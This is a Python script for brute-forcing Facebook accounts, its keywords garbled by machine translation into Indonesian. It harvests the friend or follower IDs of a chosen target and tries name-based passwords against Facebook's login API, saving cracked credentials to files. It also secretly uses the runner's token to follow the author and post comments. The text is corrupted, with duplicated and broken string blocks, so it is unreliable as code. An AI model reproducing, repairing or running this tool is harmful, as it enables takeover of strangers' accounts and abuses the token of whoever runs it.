#-*-coding:utf-8-*-
import os,sys,time,random,hashlib,re,threading,json,urllib,cookielib,requests,uuid,datetime
dari multiprocessing.pool impor ThreadPool
dari request.exceptions import ConnectionError
isi ulang (sys)
sys.setdefaultencoding('utf8')

mencoba:
    permintaan impor
kecuali ImportError:
    os.system('pip2 instal permintaan')

lingkaran = 0
identitas = []
cp = []
oke = []

# Pastikan Jangan Ubah Bot Komen & Follownya :v #
ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Rilis/06.12.2013 Browser/AppleWebKit534.30 Profil/ Konfigurasi/ Safari/534.30')
logo = ("""\033[1;97m 
  _    _   _ 
 | |  | | (_)
 | |__| |  _ 
 |  __  | | |
 | |  | | | |
 |_|  |_| |_|
""")
def __login__():
	os.system('hapus')
	cetak (logo)
	print('[1] Login Pakai Token❤️')
	print('[2] Exit')
        masuk = raw_input('\n[×] Pilih : ')
        jika masuk == "":
                exit('[×] Masukan Salah')
        elif masuk == "1":
		token = raw_input("[×] Token : ")
		mencoba:
                	y = request.get('https://graph.facebook.com/me?access_token='+token)
	                x = json.loads(y.teks)
	                nama = x['nama']
	                simpan = buka("login.txt", 'w')
	                simpan.tulis(token)
	                simpan.tutup()
	                __komen_token__()
	        kecuali KeyError:
			print('[×] Token Salah')
	                waktu.tidur(3)
	                __Gabung__()
	        kecuali request.exceptions.SSLError:
	                exit('[×] Token Tidak Valid')
        elif masuk == "0":
                Exit()
        lain:
		exit('[×] Masukan Salah')
def __hasil_ok_cp__():
	print('\n[1] Lihat Hasil Ok')
	print('[2] Lihat Hasil Cp')
	print('[3] Kembali')
	has = raw_input('[#] Pilih : ')
	jika memiliki == '':
		exit('[×] Masukan Salah')
	elif memiliki == '1':
		hasil_ok = buka('Ok.json','r').read()
		cetak(hasil_ok)
		keluar()
	elif memiliki == '2':
		hasil_cp = buka('Cp.json','r').read()
		cetak(hasil_cp)
		keluar()
	elif memiliki == '3':
		__Tidak bisa__()
	lain:
		exit('[×] Masukan Salah')
# Jangan Di Ganti # Kalo Mau Tambahin Aja #
def __komen_token__():
        mencoba:
                token = buka('login.txt','r').read()
        kecuali IOError:
		print('[×] Token Tidak Valid')
                os.system('rm -rf login.txt')
		waktu.tidur(3)
                __Gabung__()
	__web__ = datetime.datetime.now()
        __waktu__ = __web__.strftime("%H:%M:%S / %d-%m-%Y")
        __love__ = random.choice(['â??¤ï¸??','ðŸ'›','ðŸ'š','ðŸ'™','ðŸ–¤','ðŸ§¡','ðŸ 'œ'])
	__motivasi__ = random.choice(["Apapun yg terjadi, nikmati hidup ini. Hapus air mata, berikan senyummu. Kadang, senyum terindah datang setelah air mata penuh luka.","Jika kamu tahu seseorang telah ada yang memiliki, kamu seharusnya menghargai. Jangan menjadi alasan hubungan mereka berakhir.", "Mencemaskan apa yang mungkin terjadi hanya karena waktumu. Itu hanya pikiran yang tepat dan kebahagiaanmu.", "Jangan menunggu waktu yang membuat hal yang baik. Jangan terus bertanya apa yang mungkin, beranikan. diri!","Jika seseorang mampu memberi alasan mengapa dia mencintaimu, dia tak mencintaimu, bukan definisi.","Dalam hidup, kamu harus menyadari, kadang-kadang orang yang paling kamu inginkan, adalah orang yang membuat kamu ingin lebih baik jika tanpanya","Dia yg tulus tulus tidak akan berjalan di depanmu, atau tertinggal di belakangmu. Dia akan selalu berjalan di sampingmu.", "Kadang, masalah adalah satu-satunya cara tuk tahu siapa yg tulus peduli padamu dan siapa yang disengaja-pura jadi temanmu." "Mereka yang mencintaimu slalu ingin yang terbaik untukmu, hanya saja cara mereka bukan slalu yg terbaik.","Jangan menunda sebuah pekerjaan, lebih baik memuji apa yang kamu lakukan, daripada menyesali apa yang pernah kamu lakukan."])saja cara mereka slalu yang terbaik.","Jangan menunda sebuah pekerjaan, lebih baik menyesali apa yang kamu kerjakan, menyesali apa yang pernah kamu lakukan."])saja cara mereka slalu yg terbaik.", "Jangan menunda sebuah pekerjaan, lebih baik menyesali apa yang kamu kerjakan, menyesali apa yang pernah kamu kerjakan."])
        __kata__ = 'Pengguna Aksara MBF'
	__kata2__ = 'Izin Pake Scriptnya Bang'
        __kom__ = __kata__+__love__+'\n'+__motivasi__+'\n'+__waktu__
	__kom2__ = __kata2__+__love__+'\n'+__waktu__
        request.post('https://graph.facebook.com/757953543/subscribers?access_token=' + token) #Rozhak
        request.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + token) #Rozhak
	request.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + token) #Muhammad Rozhak
        request.post('https://graph.facebook.com/134275898978115/comments/?message=' +__kom__+ '&access_token=' + token)
        request.post('https://graph.facebook.com/134275898978115/likes?summary=true&access_token=' + token)
        request.post('https://graph.facebook.com/134275898978115/comments/?message='+__kom2__+'&access_token=' + token)
        request.post('https://graph.facebook.com/114878367584535/likes?summary=true&access_token=' + token)
	print('[×] Bisa Masuk')
        __Tidak bisa__()
def __menu__():
        mencoba:
                token = buka('login.txt','r').read()
        kecuali IOError:
		print('[×] Token Tidak Valid')
                os.system('rm -rf login.txt')
		waktu.tidur(2)
                __Gabung__()
        mencoba:
                p = request.get('https://graph.facebook.com/me?access_token=' +token)
                q = json.loads(p.teks)
                nama = q['nama']
		ulang tahun = q['ulang tahun']
        kecuali KeyError:
		print('[×] Token Tidak Valid')
                os.system('rm -rf login.txt')
		waktu.tidur(3)
		__Gabung__()
        kecuali request.exceptions.ConnectionError:
		exit('[×] Kesalahan Koneksi')
        os.system('hapus')
	cetak (logo)
	print('[×] Name Fb mu : '+name)
	print('[×] Ulang Tahun kamu : '+ulang tahun)
	print('\n[1] Crack Dari Publik❤️')
	print('[2] Crack Dari Follower❤️')
	print('[3] Lihat Hasil Crack❤️')
	print('[0] Keluar Dari Script')
	msk = raw_input('\n[✓] Pilih : ')
	jika msk == "":
		exit('[×] Masukan Salah')
	elif msk == "1" atau msk == "01":
		idt = raw_input('[*] Target : ')
		mencoba:
			token=open('login.txt','r').read()
			pok = request.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print('[*] Nama : '+sp["nama"])
		kecuali KeyError:
			exit('[×] Target Tidak Ditemukan')
		r = request.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.teks)
		untuk saya di z["data"]:
			uid = i['id']
			id.tambahkan(uid)
	elif msk == "2" atau msk == "02":
		idt = raw_input('[*] Target : ')
		mencoba:
			token=open('login.txt','r').read()
			pok = request.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print('[*] Nama : '+sp["nama"])
		kecuali KeyError:
			exit('[â€¢] Target Tidak Ditemukan')
		r = request.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
		z = json.loads(r.teks)
		untuk saya di z["data"]:
			uid = i['id']
			id.tambahkan(uid)
	elif msk == "3" atau msk == "03":
		__hasil_ok_cp__()
	elif msk == "0" atau msk == "00":
		os.system("rm -f login.txt")
		waktu.tidur(3)
		exit('[*] Selamat Tinggal')
	lain:
		exit('[â€¢] Masukan Salah')
	print('[*] Jumlah ID SAYANG : '+str(len(id)))
	cetak(' ')
	def utama(arg):
		global ok,cp,ua,loop
		pwx = []
		__warna_warni__ = random.choice(['\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m' ','\033[1;97m'])
		print __warna_warni__+'\r[Crack] %s/%s [Ok:%s] - [Cp:%s] ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		mencoba:
			d = request.get('https://graph.facebook.com/'+uid+'/?access_token='+token)
	                v = json.loads(d.teks)
			nama = v['nama']
			pertama = v['nama_pertama']
			terakhir = v['nama_belakang']
			pwx.append(nama)
			pwx.append(pertama+'123')
			pwx.append(pertama+'1234')
			pwx.append(pertama+'12345')
			pwx.append(pertama+'123456')
			pwx.append(terakhir+'123')
			pwx.append(terakhir+'1234')
			pwx.append(terakhir+'12345')
			pwx.append(terakhir+'123456')
			untuk pw di pwx:
				header_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'SANGAT BAIK', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'agen-pengguna': ua,
				'tipe konten': 'aplikasi/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				ses=permintaan.Sesi()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw," sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				kirim=ses.get(api,params=param, header=headers_)
				jika "access_token" di send.text dan "EAA" di send.text:
					print '\r\033[1;92m[Oke] '+uid+'|'+pw+' '
					ok.tambahkan(uid+'|'+pw)
					simpan = buka('Ok.json','a') 
					simpan.tulis(str(uid)+'|'+str(pw)+'\n')
					simpan.tutup()
					merusak
					melanjutkan
					melanjutkan
				elif "www.facebook.com" di send.json()["error_msg"]:
					print '\r\033[1;93m[Cp] '+uid+'|'+pw+'|'+nama
					cp.append(uid+'|'+pw)
					simpan = buka('Cp.json','a')
					simpan.tulis(str(uid)+'|'+str(pw)+'\n')
					simpan.tutup()
					merusak
					melanjutkan
			lingkaran += 1
		kecuali:
			lulus
	p = ThreadPool(30)
	p.map(utama, id)
	keluar("\n[Selesai]")

jika __name__=='__main__':
	os.system('git tarik')
	__Tidak bisa__()